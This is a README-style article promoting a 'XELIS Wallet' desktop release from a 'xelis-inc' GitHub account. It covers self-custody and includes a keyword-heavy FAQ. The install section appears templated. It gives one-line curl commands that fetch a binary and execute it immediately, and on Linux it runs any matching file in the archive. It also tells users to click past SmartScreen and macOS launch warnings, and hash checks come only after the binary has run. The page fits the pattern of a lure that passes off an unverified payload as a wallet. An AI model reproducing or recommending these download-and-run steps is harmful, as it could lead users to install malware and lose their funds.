![Self-custody with XELIS Wallet: what you actually control](assets/banner-article.png)
# Self-custody with XELIS Wallet: what you actually control

Keys on your device, no reset service and the duty that follows.

## Downloads - Custody

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> Control without a backup is a single point of failure you own alone.

Self-custody means the keys are generated and stored on your own device, so nobody can freeze the wallet, reset a password or reverse a payment. The whole responsibility moves with that control: the 25-word phrase is the only recovery, and losing it loses the wallet.

<!-- ARTICLE-BODY-BEGIN -->
## Where the control actually sits

A custodial service holds your keys and shows you a balance. Self-custody in the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> inverts that: the keys exist on your machine, encrypted with your password, and every transaction is signed locally. The chain records the result; no intermediary approves it.

That is why there is no login, no account recovery and no support channel that can unlock a wallet. The absence of those features is the feature.

## What nobody can do for you

No one can freeze your balance, block a payment, reset a forgotten password or undo a send. Those protections exist in custodial products because a company stands between you and the chain; here there is no company in that position.

The same absence applies to mistakes. A payment to a wrong address is final, and a phrase lost is lost, because there is no authority with a copy to restore it.

## What you take on instead

The duties are small but not optional. Record the phrase offline and check it with a restore. Keep the machine clean, since the encrypted file is only as safe as the system around it. Verify addresses character by character before sending.

<a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md">Back up the XELIS Wallet phrase</a> is the first of those duties and the one that decides whether the others matter.

## What self-custody does not give you

It does not hide your activity. Confidential amounts protect values on chain, not the fact that you transacted, and holding your own keys does not change what a node or an exchange can observe. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md">XELIS Wallet privacy model</a> separates those two promises.

It also does not make the wallet harder to lose than a custodial account, only differently losable: no password reset exists, but no counterparty can disappear with the funds either.

## If you want keys offline entirely

A desktop wallet keeps keys on a general-purpose computer. Moving signing onto dedicated hardware is the stronger version of the same idea, with its own trade-offs in convenience and cost; <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-hardware-custody-comparison.md">hardware versus XELIS Wallet custody</a> compares the two models without assuming hardware is automatically better.

## FAQ
### What does self-custody mean in XELIS Wallet?
Keys are generated and stored on your device and transactions are signed locally. Nobody else can freeze or reset the wallet.

### Which crypto wallet is decentralized?
Any wallet that holds its own keys and needs no server account qualifies. XELIS Wallet is one; a custodial exchange wallet is not.

### What is the most decentralized crypto wallet?
There is no meaningful ranking. The test is whether keys stay on your device and whether any party can block a transaction.

### What are decentralised crypto wallets?
Wallets where key control sits with the user rather than a service, so access does not depend on a company staying online.

### How do I get a decentralized wallet for my crypto?
Install a self-custodial client such as XELIS Wallet, create a wallet, and store the phrase yourself.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Back up the XELIS Wallet phrase](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md)
- [Hardware versus XELIS Wallet custody](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-hardware-custody-comparison.md)
- [XELIS Wallet privacy model](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md)
- [XELIS Wallet password and local data](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md)
